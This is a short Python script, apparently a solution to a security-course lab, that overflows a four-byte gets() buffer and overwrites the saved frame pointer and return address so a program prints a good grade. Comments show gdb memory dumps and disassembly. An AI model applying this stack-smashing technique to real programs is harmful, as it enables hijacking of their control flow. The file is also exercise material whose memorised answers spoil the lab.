#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# Overflow the input buffer:
#
# char input[4];
# gets(input);
sys.stdout.buffer.write(("\x00\x00\x00\x00").encode())

# What are the current values of the saved frame pointer and return address from the stack
# frame? You can examine two words of memory at %ebp using: (gdb) x/2wx $ebp
#
# (gdb)  x/2wx $ebp
# 0xfffe9648:     0xfffe9650      0x080488f0
#
# Base Pointer (is ok to overwrite)
sys.stdout.buffer.write(pack("<I", 0xfffe9650))

# Must overwrite the return address from the start of print_bad_grade to start of print_good_grade
#
# (gdb) disas print_good_grade
# Dump of assembler code for function print_good_grade:
#    0x080488bc <+0>:     push   %ebp
#    0x080488bd <+1>:     mov    %esp,%ebp
#    0x080488bf <+3>:     push   $0x80abf1b
#    0x080488c4 <+8>:     call   0x80504d0 <puts>
#    0x080488c9 <+13>:    add    $0x4,%esp
#    0x080488cc <+16>:    push   $0x1
#    0x080488ce <+18>:    call   0x804ef20 <exit>
# End of assembler dump.
sys.stdout.buffer.write(pack("<I", 0x080488bc))
